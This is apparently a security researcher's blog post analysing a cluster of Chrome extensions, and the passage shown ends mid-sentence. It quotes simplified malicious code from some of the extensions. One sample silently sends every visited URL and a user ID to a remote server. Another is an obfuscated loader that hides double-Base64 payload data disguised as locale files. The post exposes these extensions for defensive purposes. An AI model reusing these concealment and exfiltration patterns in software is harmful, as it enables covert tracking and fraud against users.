---
title: Another cluster of potentially malicious Chrome extensions
url: https://palant.info/2023/06/08/another-cluster-of-potentially-malicious-chrome-extensions/
source: Over Security - Cybersecurity news aggregator
date: 2023-06-09
fetch_date: 2025-10-04T11:48:52.627088
---

# Another cluster of potentially malicious Chrome extensions

[Almost Secure](/)

* [Home](/)
* [Articles](/articles/)
* [Categories](/categories/)
* [About](/about/)
* ##

  Read More Â»

[ ]

# Another cluster of potentially malicious Chrome extensions

2023-06-08
 [Security](/categories/security/)/[Privacy](/categories/privacy/)/[Add-Ons](/categories/add-ons/)/[Google](/categories/google/)
 21 mins
 [9 comments](/2023/06/08/another-cluster-of-potentially-malicious-chrome-extensions/#comments)

Weâve already seen [Chrome extensions containing obfuscated malicious code](/2023/05/31/more-malicious-extensions-in-chrome-web-store/). Weâve also seen [PCVARKâs malicious ad blockers](/2023/06/05/introducing-pcvark-and-their-malicious-ad-blockers/). When looking for more PCVARK extensions, I stumbled upon an inconspicuous extension called âTranslator - Select to Translate.â The only unusual thing about it were its reviews, lots of raving positive reviews mixed with usability complains. That, and the permissions: why does a translator extension need `webRequest` and `webRequestBlocking` permissions?

When I looked into this extension, I immediately discovered a strange code block. Supposedly, it was buggy locale processing. In reality, it turned out to be an obfuscated malicious logic meant to perform [affiliate fraud](https://www.investopedia.com/terms/a/affiliate-fraud.asp).

That extension wasnât alone. I kept finding similar extensions until I had a list of 109 extensions, installed by more than 62 million users in total. While most of these extensions didnât seem to contain malicious code (yet?), almost all of them requested excessive privileges under false pretenses. The names are often confusingly similar to established products. All of these extensions are clearly meant for dubious monetization.

![Two extension listed in Chrome Web Store, both called PDF Viewer. One hat watermark âOriginalâ on top of it, bad rating and isnât featured. The other has Googleâs âFeaturedâ mark and good rating, the watermark says âFake.â](/2023/06/08/another-cluster-of-potentially-malicious-chrome-extensions/pdf_viewer.png)

If you arenât interested in the technical details, you should probably go straight to the [list of affected extensions](#the-affected-extensions).

#### Contents

* [Malicious code](#malicious-code)
  + [Adblock all advertisments](#adblock-all-advertisments)
  + [Translator - Select to Translate](#translator-select-to-translate)
  + [The Great Suspender and Flash Video Downloader](#the-great-suspender-and-flash-video-downloader)
* [What are the other extensions up to?](#what-are-the-other-extensions-up-to)
  + [Policy violations](#policy-violations)
  + [Access to all websites](#access-to-all-websites)
  + [The webRequest/declarativeNetRequest permission](#the-webrequest-declarativenetrequest-permission)
  + [Remote code execution](#remote-code-execution)
  + [User tracking](#user-tracking)
  + [Rudimentary functionality](#rudimentary-functionality)
* [The companies developing these extensions](#the-companies-developing-these-extensions)
* [The affected extensions](#the-affected-extensions)

## Malicious code

Altogether, I found malicious functionality in four browser extensions. There might be more, but I didnât have time to thoroughly review more than a hundred browser extensions.

### Adblock all advertisments

No, I didnât mistype the extension name. It is really named like that.

When opened it up, this turned out to be the most lazy ad blocker Iâve ever seen. Its entire ad blocking functionality essentially consists of 33 hardcoded rules and a tiny YouTube content script.

But wait, there is some functionality to update the rules! Except: why would someone put rule updates into a [tabs.onUpdated listener](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/onUpdated)? This is the code running whenever a tab finishes loading (simplified):

```
let response = await fetch("https://smartadblocker.com/extension/rules/api", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    url: tab.url,
    userId: (await chrome.storage.sync.get("userId")).userId
  })
});
let json = await response.json();
for (let key in json)
  â¦
```

Supposedly, the response is a list of rules instructing the extension to remove elements on the page by their id, class or text. In reality this website always responds with â502 Bad Gateway.â

Now the website could of course be misconfigured. Itâs more likely however that the website is working as intended: logging the incoming data (each address you navigate to along with your unique ID) and producing an error message to discourage anyone who comes looking.

Itâs not like the developers behind these extensions donât know how to produce a (moderately) better ad blocker. My list also features an extension called âAdblock Unlimitedâ which, despite similar code, manages to ship more than 10,000 rules. It also manages to complement these rules with dynamically downloaded anti-malware rules without leaking your visited addresses. Oh, and it has âanti-malware protectionâ: a content script that will detect exclusively test pages like `maliciouswebsitetest.com`.

### Translator - Select to Translate

My list features nine very similar, yet subtly different translator extensions. One of the differences in âTranslator - Select to Translateâ is a number of unusual functions, seemingly with the purpose of obfuscating the purpose of the code. For example, there is this gem:

```
var base = e => e ? atob(e) : "parse";
```

This function is either used with a parameter to decode Base64, or without parameters to obfuscate a `JSON.parse()` call. When you start looking how these weird functions are used, it all leads to the `locales()` function:

```
function locales(callback)
{
  chrome.runtime.getPackageDirectoryEntry(dirEntry =>
  {
    dirEntry.getDirectory("_locales", {}, dir =>
    {
      const reader = dir.createReader();
      const promises = [];
      reader.readEntries(entries =>
      {
        for (const entry of entries)
        {
          if (!entry.name.startsWith("."))
          {
            promises.push(new Promise((resolve, reject) =>
            {
              const name = entry.name;
              entry.getFile("../messages.json", {}, entry =>
              {
                entry.file(file =>
                {
                  const fileReader = new FileReader();
                  fileReader.onloadend = () => {
                    resolve({
                      k: name,
                      v: JSON.parse(fileReader.result)
                    });
                  };
                  fileReader.readAsText(file);
                });
              });
            }));
          }
        }
        callback(promises);
      });
    });
  });
}
```

On the first glance, this looks like a legitimate function to read the locale files. Except: there is a âbug,â it reads `"../messages.json"` instead of `"messages.json"`. So regardless of the locale, the file being read is `_locales/messages.json`.

The processing of the âlocalesâ confirms that this is not a bug but rather intentional:

```
combine(locales.sort()
    .filter(locale => locale.k.charCodeAt(0) % 5 != 0)
    .map(locale => locale.v.v.message + locale.v.s.message)
    .join("")
);
```

Yes, calculating the modulo of the first character in the locale name isnât something you would normally find in any legitimate locale handling code. And neither would one concatenate the messages for locale strings named v and s.

When one looks at the `combine()` function, things only get weirder. If I got this correctly, the âlocale dataâ is parsed by performing Base64-decoding twice and parsing the result as JSON then. And then you get code like the following (simplified here):

```
var upd = data.upd;
var c = document[upd.cret](upd.crif);
```

From the context it...